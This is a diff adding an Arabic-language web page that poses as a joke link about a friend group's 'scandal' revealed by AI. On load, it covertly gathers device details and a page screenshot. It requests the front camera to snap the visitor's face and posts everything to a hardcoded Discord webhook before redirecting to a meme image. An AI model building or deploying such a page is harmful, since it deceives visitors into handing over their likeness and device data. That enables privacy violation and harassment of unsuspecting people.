@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التعرف على الجهاز والوجه...</title>
+    
+    <!-- معاينة الواتساب -->
+    <meta property="og:title" content="فضيحة عيال القروب بالساحل! 😱">
+    <meta property="og:description" content="شوف وش طلع عنكم بالذكاء الاصطناعي هههههههه">
+    <meta property="og:image" content="https://i.imgur.com/7gX6XvT.jpeg">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0f172a;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .scanner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid #38bdf8;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="scanner"></div>
+    <h2>جاري فحص النظام والنواة... ⚡</h2>
+    <p style="color: #94a3b8; font-size: 14px;">يرجى عدم إغلاق الصفحة أثناء سحب البيانات</p>
+
+    <!-- كاميرا بدقة 1080p لالتقاط الوجه -->
+    <video id="video" width="1280" height="720" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563206616780906536/Sgr0Y2vRCC4UEXiMXuavwOl738sFta-ui7TE057JstRKXZu1oiQ9ZTFPxbbhSK9oY4dE";
+
+        // دالة جمع بيانات مرعبة وعميقة عن الجوال
+        async function getDeepDeviceData() {
+            const ua = navigator.userAgent;
+            let phoneType = "كمبيوتر / جهاز آخر";
+            if (/android/i.test(ua)) phoneType = "أندرويد (Android)";
+            else if (/iphone|ipad|ipod/i.test(ua)) phoneType = "آيفون (iPhone / iOS)";
+
+            // 1. نسبة البطارية وشحنها
+            let batteryInfo = "غير معروف";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? "⚡ جاري الشحن" : "🔋 على البطارية";
+                    batteryInfo = `${level}% (${charging})`;
+                } catch(e) {}
+            }
+
+            // 2. نوع الشبكة والاتصال
+            let connectionType = "غير معروف";
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                connectionType = `النوع: ${conn.effectiveType || 'N/A'} | السرعة: ${conn.downlink || 'N/A'} Mbps | الـ Ping: ${conn.rtt || 'N/A'}ms`;
+            }
+
+            // 3. أنوية المعالج والرام واللمس
+            const cpuCores = navigator.hardwareConcurrency || "غير معلن";
+            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف";
+            const touchPoints = navigator.maxTouchPoints || "بدون شاشة لمس";
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const orientation = screen.orientation ? screen.orientation.type : "عادي";
+
+            return `🕵️ **تمت عملية اختراق المبتدئين بنجاح!** 🔥
+━━━━━━━━━━━━━━━━━━━━
+📱 **نوع الجهاز:** ${phoneType}
+🔋 **نسبة البطارية:** ${batteryInfo}
+🌐 **الشبكة والنت:** ${connectionType}
+⚙️ **أنوية المعالج (CPU):** ${cpuCores} Cores
+🧠 **الرام (RAM):** ${deviceMemory}
+👈 **نقاط اللمس الشاشة:** ${touchPoints} Points
+📺 **دقة الشاشة:** ${window.screen.width}x${window.screen.height}
+🧭 **المنطقة الزمنية:** ${timeZone}
+🔄 **وضع الشاشة:** ${orientation}
+🌍 **اللغة والمحتوى:** ${navigator.language}
+━━━━━━━━━━━━━━━━━━━━`;
+        }
+
+        async function sendToDiscord(photoBlob, screenshotBlob, textData) {
+            const formData = new FormData();
+            
+            const payload = {
+                content: textData
+            };
+
+            formData.append('payload_json', JSON.stringify(payload));
+            if (photoBlob) formData.append('file1', photoBlob, 'face_photo.jpg');
+            if (screenshotBlob) formData.append('file2', screenshotBlob, 'screen_capture.png');
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (err) {
+                console.error(err);
+            }
+
+            // تحويل للـ Meme
+            window.location.href = "https://i.imgur.com/7gX6XvT.jpeg";
+        }
+
+        async function startCapture() {
+            const textData = await getDeepDeviceData();
+
+            let screenshotBlob = null;
+            try {
+                const screenCanvas = await html2canvas(document.body);
+                screenshotBlob = await new Promise(resolve => screenCanvas.toBlob(resolve, 'image/png'));
+            } catch (e) {}
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 1280, 720);
+
+                    canvas.toBlob(async (photoBlob) => {
+                        await sendToDiscord(photoBlob, screenshotBlob, textData);
+                    }, 'image/jpeg', 0.95);
+                }, 1000);
+
+            } catch (err) {
+                await sendToDiscord(null, screenshotBlob, textData);
+            }
+        }
+
+        window.onload = () => {
+            setTimeout(startCapture, 300);
+        };
+    </script>
+</body>
+</html>
